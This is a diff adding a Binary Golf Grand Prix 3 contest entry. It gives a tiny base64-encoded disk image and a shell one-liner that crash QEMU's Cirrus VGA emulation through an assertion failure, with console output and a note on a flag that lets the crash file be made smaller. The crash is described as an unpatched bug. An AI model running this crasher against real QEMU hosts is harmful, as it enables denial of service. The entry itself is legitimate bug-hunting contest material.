@@ -1,0 +1,39 @@
+---BEGIN BGGP3 ENTRY---
+Name or handle: Retr0id
+Contact Info: https://twitter.com/David3141593
+Website, twitter, other online presence: https://twitter.com/David3141593
+Target Software and Version: Tested on QEMU 6.2.0, 7.0.0, 7.1.0-rc2 (still 0day)
+Description of Target Software's Environment (Platform/OS, Setup
+Instructions, etc.): Tested on Ubuntu 22.04, macOS 12.5.1. Run the
+command: base64
+-d<<<uAJPuxhBzRC61AO+E3y5BQDzbwcMDOgTCReKG4I=>a;qemu-system-i386 -vga
+cirrus -no-fd-bootchk -fda a
+Target File Type: raw disk image
+SHA256 Hash: 2e72c47104f639f4ac6423387c812c110a0bdf88513ca035c9a70adf243fc0cc
+Brief Description of Crash: An assert() is triggered in QEMU's Cirrus
+VGA emulation code
+Was this a new crash, or a known bug? new crash
+Link to PoC video, screenshot, or console output, if any:
+
+david@davids-MacBook-Pro /tmp % qemu-system-i386 --version
+QEMU emulator version 7.0.0
+Copyright (c) 2003-2022 Fabrice Bellard and the QEMU Project developers
+david@davids-MacBook-Pro /tmp % base64
+-d<<<uAJPuxhBzRC61AO+E3y5BQDzbwcMDOgTCReKG4I=>a;qemu-system-i386 -vga
+cirrus -no-fd-bootchk -fda a
+WARNING: Image format was not specified for 'a' and probing guessed raw.
+Automatically detecting the format is dangerous for raw
+images, write operations on block 0 will be restricted.
+Specify the 'raw' format explicitly to remove the restrictions.
+Assertion failed: (start + length <= snap->end), function
+cpu_physical_memory_snapshot_get_dirty, file physmem.c, line 1128.
+zsh: abort qemu-system-i386 -vga cirrus -no-fd-bootchk -fda a
+
+
+Link to writeup, if any: No writeup, but a QEMU golfing trick I just
+discovered - the `-no-fd-bootchk` flag skips checking for the boot
+signature (at offset 0x1fe), so you can get your input files down to
+below 0x200 bytes.
+CVE or other acknowledgement, if any: N/A
+File contents (base64 encoded please): uAJPuxhBzRC61AO+E3y5BQDzbwcMDOgTCReKG4I=
+---END BGGP3 ENTRY---
